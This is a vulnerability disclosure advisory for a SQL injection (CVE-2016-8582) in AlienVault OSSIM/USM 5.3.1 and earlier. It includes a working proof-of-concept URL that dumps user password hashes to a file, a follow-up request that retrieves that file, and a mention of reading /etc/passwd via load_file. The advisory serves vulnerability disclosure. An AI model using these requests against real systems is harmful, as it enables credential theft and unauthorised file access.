Product: Alienvault OSSIM/USM
Vulnerability: SQL Injection
Author: Peter Lapp, lappsec () gmail com
CVE: CVE-2016-8582
Vulnerable Versions: <=5.3.1
Fixed Version: 5.3.2



Vulnerability Details
=====================

A SQL injection vulnerability exists in the value parameter of
/ossim/dashboard/sections/widgets/data/gauge.php on line 231. By
sending a serialized array with a SQL query in the type field, it's
possible to execute an arbitrary SQL query. The result is not
displayed on the screen, but it can be exploited as a blind SQLi or
have the output directed to a file and then retrieved via another
request. Authentication is required.



POC
===

This request will dump user password hashes to a file:

/ossim/dashboard/sections/widgets/data/gauge.php?&type=alarm&wtype=blah&asset=1&height=1&value=a%3A1%3A%7Bs%3A4%3A%22type%22%3Bs%3A67%3A%22pass+from+users+INTO+OUTFILE+%27%2Ftmp%2F10.0.0.123_pass_tshark.pcap%27--+-%22%3B%7D

The file containing the output can then be retrieved with the following request:
/ossim/pcap/download.php?scan_name=pass&sensor_ip=10.0.0.123

It's also possible to read the contents of any file readable by the
mysql user by using mysql's load_file function. For example, changing
the request to something like select load_file('/etc/passwd') .



Timeline
========

08/03/16 - Reported to Vendor
10/03/16 - Fixed in version 5.3.2
